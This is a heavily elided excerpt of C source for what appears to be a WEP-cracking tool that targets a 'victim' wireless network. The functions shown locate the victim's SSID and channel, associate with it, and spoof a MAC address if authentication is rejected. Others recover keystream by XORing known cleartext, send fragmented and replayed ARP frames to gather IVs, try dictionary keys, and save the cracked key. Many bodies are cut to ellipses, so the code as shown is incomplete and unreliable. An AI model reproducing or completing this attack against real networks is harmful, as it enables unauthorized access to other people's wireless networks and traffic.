...
unsigned int
udp_checksum(unsigned char *stuff, int len, struct in_addr *sip,
    struct in_addr *dip)
{
	unsigned char *tmp;
	struct ippseudo *ph;
...
void
set_if_mac(unsigned char *mac, unsigned char *name)
{
	int s;
	struct ifreq ifr;
...
void
send_frame(int tx, unsigned char *buf, int len)
{
...
unsigned short
fnseq(unsigned short fn, unsigned short seq)
{
	unsigned short r = 0;
...
void
fill_basic(struct ieee80211_frame *wh)
{
	unsigned short *sp;
...
send_assoc(int tx)
{
	...
	*body++ = 22;
	...
	send_frame(tx, buf,
	    sizeof(*wh) + 2 + 2 + 2 + strlen(victim.ssid) + 2 + 4);
}

void
wepify(unsigned char *body, int dlen)
{
	uLong crc;
	unsigned long *pcrc;
	int i;
...
int
get_victim_ssid(struct ieee80211_frame *wh, int len)
{
	unsigned char *ptr;
	int x;
	int gots = 0, gotc = 0;
	...
	if (gots && gotc) {
		...
		time_print("Found SSID(%s) BSS=(%s) chan=%d\n", victim.ssid,
		    mac2str(victim.bss), victim.chan);
		return 1;
	}
	return 0;
}
...
void
do_llc(unsigned char *buf, unsigned short type)
{
...
void
set_prga(unsigned char *iv, unsigned char *cipher, unsigned char *clear,
    int len)
{
	...
	for (i = 0; i < len; i++) {
		prgainfo.prga[i] = (cipher ? (clear[i] ^ cipher[i]) : clear[i]);
	}
...
void
log_dictionary(unsigned char *body, int len)
{
	char paths[3][3];
	int i, rd;
	int fd;
	...
	if (fd != -1) {
		...
		// check consistency....
		for (i = 0; i < rd; i++) {
			if (file_clear[i] != (data[i] ^ inet_clear[i])) {
...
void
stuff_for_us(struct ieee80211_frame *wh, int len)
{
	int type, stype;
	unsigned char *body;
	...
	if (type == IEEE80211_FC0_TYPE_MGT) {
		if (stype == IEEE80211_FC0_SUBTYPE_DEAUTH) {
			...
			if (*sc == 1) {
				time_print(
				    "Auth rejected... trying to spoof mac.\n");
				state = SPOOF_MAC;
				return;
			} else if (*sc == 0) {
	...
	if (type == IEEE80211_FC0_TYPE_DATA &&
		...
		if (!(wh->i_fc[1] & IEEE80211_FC1_PROTECTED)) {
			time_print(
			    "WARNING: Got NON wep packet from %s dlen %d stype=%x\n",
...
void
decrypt_arpreq(struct ieee80211_frame *wh, int rd)
{
	unsigned char *body;
	int bodylen;
...
void
log_wep(struct ieee80211_frame *wh, int len)
{
	int rd;
...
void
try_dictionary(struct ieee80211_frame *wh, int len)
{
	unsigned char *body;
	char path[52];
	char paths[3][3];
...
void *
get_sa(struct ieee80211_frame *wh)
{
	if (wh->i_fc[1] & IEEE80211_FC1_DIR_FROMDS)
		return wh->i_addr3;
	else
...
void *
get_da(struct ieee80211_frame *wh)
{
	if (wh->i_fc[1] & IEEE80211_FC1_DIR_FROMDS)
		return wh->i_addr1;
	else
...
int
known_clear(void *clear, struct ieee80211_frame *wh, int len)
{
...
void
add_keystream(struct ieee80211_frame *wh, int rd)
{
...
void
got_wep(struct ieee80211_frame *wh, int rd)
{
	int bodylen;
	int dlen;
	unsigned char clear[1024];
	...
	if ((wh->i_fc[1] & IEEE80211_FC1_DIR_FROMDS) &&
	    ...
	    (dlen == 36 || dlen == PADDED_ARPLEN) && !decryptstate.cipher &&
	    !netip) {
	...
	if (prgainfo.len != 0) {
		...
		if ((wh->i_fc[1] & IEEE80211_FC1_DIR_FROMDS) &&
			...
			time_print("Got clear-text byte: %d\n",
			    decryptstate.cipher[decryptstate.prgainfo.len - 1] ^
				pr);

			decryptstate.prgainfo
			    .prga[decryptstate.prgainfo.len - 1] = pr;
...
void
stuff_for_net(struct ieee80211_frame *wh, int rd)
{
	int type, stype;
...
void
anal(unsigned char *buf, int rd, int tx)
{ // yze
	struct ieee80211_frame *wh = (struct ieee80211_frame *)buf;
	int type, stype;
...
void
do_arp(unsigned char *buf, unsigned short op, unsigned char *m1,
    unsigned char *i1, unsigned char *m2, unsigned char *i2)
{
...
void
send_fragment(int tx, struct frag_state *fs, struct prga_info *pi)
{
...
void
prepare_fragstate(struct frag_state *fs, int pad)
{
	fs->waiting_relay = 0;
	fs->len = 8 + 8 + 20 + pad;
	...
	do_arp(&fs->data[8], ARPOP_REQUEST, mymac, myip,
	...
	fs->wh.i_fc[1] |= IEEE80211_FC1_DIR_TODS | IEEE80211_FC1_MORE_FRAG |
...
decrypt(int tx)
{
	...
	if (!decryptstate.fragstate.data) {
		...
		memcpy(decryptstate.fragstate.wh.i_addr3, MCAST_PREF, 5);
	...
	send_fragment(tx, &decryptstate.fragstate, &decryptstate.prgainfo);
}
...
void
send_arp(int tx, unsigned short op, unsigned char *srcip, unsigned char *srcmac,
    unsigned char *dstip, unsigned char *dstmac)
{
...
can_write(int tx)
{
	...
	case GOT_ASSOC:
		...
		if (netip && !rtrmac) {
			...
			send_arp(tx, ARPOP_REQUEST, myip, mymac, arp_ip,
...
void
save_key(unsigned char *key, int len)
{
	char tmp[16];
	char k[64];
	int fd;
...
read_tap()
{
	...
	if (taptx_len) {
		printf("\n");
		time_print(
		    "Sorry... overflow in TAP queue [of 1 packet =P] overwriting\n");
...
int
elapsedd(struct timeval *past, struct timeval *now)
{
	int el;
...
get_80211(unsigned char **data, int *totlen, int *plen)
{
#define BIT(n) (1 << (n))
	struct bpf_hdr *bpfh;
...
static int
read_packet(int fd, unsigned char *dst, int len)
{
	...
	while (1) {
		...
		if ((now.tv_sec > last_status.tv_sec) ||
			...
			if (netip && prgainfo.len >= min_prga &&
			    rtrmac > (unsigned char *)1) {
				time_print(
				    "WEP=%.9d (next crack at %d) IV=%.2x:%.2x:%.2x (rate=%d)         \r",
				    weplog.packets, wep_thresh, weplog.iv[0],
				    weplog.iv[1], weplog.iv[2], weplog.rate);
				fflush(stdout);
			} else {
				if (state == FIND_VICTIM)
					...
					unsigned char prga =
					    decryptstate.prgainfo.prga[pos];
					assert(pos);

					time_print(
					    "Guessing PRGA %.2x (IP byte=%d)    \r",
					    prga,
					    decryptstate.cipher[pos] ^ prga);
				} else
		...
		if (state == FIND_VICTIM) {
			...
			if ((now.tv_sec - last_wcount.tv_sec) >= 2) {
				...
				weplog.rate = (int)((double)packetz /
...
void
str2mac(unsigned char *dst, unsigned char *mac)
{
	unsigned int macf[6];
	int i;

	if (sscanf(mac, "%x:%x:%x:%x:%x:%x", &macf[0], &macf[1], &macf[2],
